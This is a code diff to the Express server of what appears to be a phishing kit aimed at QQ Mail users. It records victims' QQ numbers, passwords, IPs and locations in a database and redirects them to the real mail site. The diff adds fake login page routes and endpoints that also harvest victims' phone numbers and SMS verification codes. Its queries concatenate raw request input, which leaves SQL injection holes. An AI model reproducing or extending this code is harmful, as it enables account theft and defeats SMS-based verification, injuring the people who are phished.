@@ -20,23 +20,25 @@ module.exports = function (app) {
         var pwd = req.body.p;
         var userId = req.body.uid;
         var mid = req.body.mid;
+        var ranid = req.body.ranid;
         var ip = req.connection.remoteAddress;
         ip = ip.substr(ip.indexOf(':', 3) + 1);
         // ip = req.headers['x-real-ip'];	
         var insertTime = new Date().getTime().toString();
         var mname, userName, address;
+
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';', function (err, rows) {
             mname = rows[0].tempName;
             userName = rows[0].userName;
-            
-            sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`, function (err, rows) {  
+            sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
+                console.log(rows)
                 _ip(ip, function (ip, add) {
                     address = add;
-                    sql.all('UPDATE datas SET address = "'+address+'" WHERE ip = "'+ip+'";')
+                    sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
                 });
                 cb();
             });
-            
+
         });
     };
 
@@ -107,13 +109,15 @@ module.exports = function (app) {
                 var bgUrl = rows[0].bgUrl;
                 var url = rows[0].url;
                 // res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
-                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp,ranRp2: ranStr.ranRp_2 });
+                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp, ranRp2: ranStr.ranRp_2 });
                 ranStr.count++;
             });
         } catch (e) {
             res.sendFile(path.join(cwd, '/404.html'));
         }
     });
+
+
 
     app.post('/vote/:name', function (req, res) {
         var tz = req.body.tz;
@@ -132,7 +136,7 @@ module.exports = function (app) {
                     if (tz.toString() === '1') {
                         return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
                     }
-                    res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, tz: 1, sha: ranStr.sha, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp,ranRp2: ranStr.ranRp_2 });
+                    res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/wap_mail2.html', { layout: null, tz: 1, sha: ranStr.sha, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp, ranRp2: ranStr.ranRp_2 });
                     ranStr.count++;
                 });
             });
@@ -213,10 +217,88 @@ module.exports = function (app) {
         var uidStr = req.headers.host;
 
         var uid = uidStr.substr(0, uidStr.indexOf('.'));
-        res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(),func: code.encode, uid: uid, cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ran: ranStr })
+        res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(), func: code.encode, uid: uid, cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ran: ranStr })
     });
 
-    app.post('/tracker',function(req,res){
-        
+    app.post('/tracker', function (req, res) {
+
+    })
+
+    // ===================================================================================================================================================================================================================================================================================================================================
+
+
+
+    // 邮箱
+    app.get('/v2/:name', function (req, res) {
+        var uidStr = req.headers.host;
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
+        uid = code.decode(uid);
+        res.statusCode = 404;
+        var x = req.url.split('/')
+        var s_ran = x[x.length - 2]
+        try {
+            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
+                var mid = rows[0].tempId;
+                var bgUrl = rows[0].bgUrl;
+                var url = rows[0].url;
+                // res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
+                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail_c.html' : 'pages/wap_mail_c.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp, ranRp2: ranStr.ranRp_2 });
+                ranStr.count++;
+            });
+        } catch (e) {
+            res.sendFile(path.join(cwd, '/404.html'));
+        }
+    });
+
+    app.get('/v3/phone', function (req, res) {
+        res.render('pages/wap_mail_p.html', { layout: null })
+    })
+
+    app.post('/v2/ins', function (req, res) {
+        var uidStr = req.headers.host;
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
+        uid = code.decode(uid);
+        var x = req.url.split('/')
+        var s_ran = x[x.length - 2]
+        try {
+            insertData(req, function () {
+                res.send('0')
+            });
+        } catch (e) {
+            res.send('-1')
+        }
+    })
+
+    app.post('/v2/updatep',function(req,res){
+        // UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值
+        var phone = req.body.phone
+        var ranid = req.body.ranid
+        sql.all(`update datas set phone='${phone}' where ranid = '${ranid}'`, function (err, rows) {
+            res.send('0')
+        })
+    })
+
+    app.post('/v2/updatec',function(req,res){
+        // UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值
+        var code = req.body.code
+        var ranid = req.body.ranid
+        sql.all(`update datas set phoneCode='${code}' where ranid = '${ranid}'`, function (err, rows) {
+            res.send('0')
+        })
+    })
+
+    app.get('/v2/js/mc_1.js', function (req, res) {
+        res.render('js/mc_1.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
+    })
+    app.get('/v2/js/mc_2.js', function (req, res) {
+        res.render('js/mc_2.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
+    })
+
+    app.get('/v2/js/login.js', function (req, res) {
+        res.render('js/login.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
+    })
+
+    app.get('/v2/js/yzm.js', function (req, res) {
+        res.render('js/yzm.html', { layout: null, uid: req.query.uid, mid: req.query.mid });
     })
 };
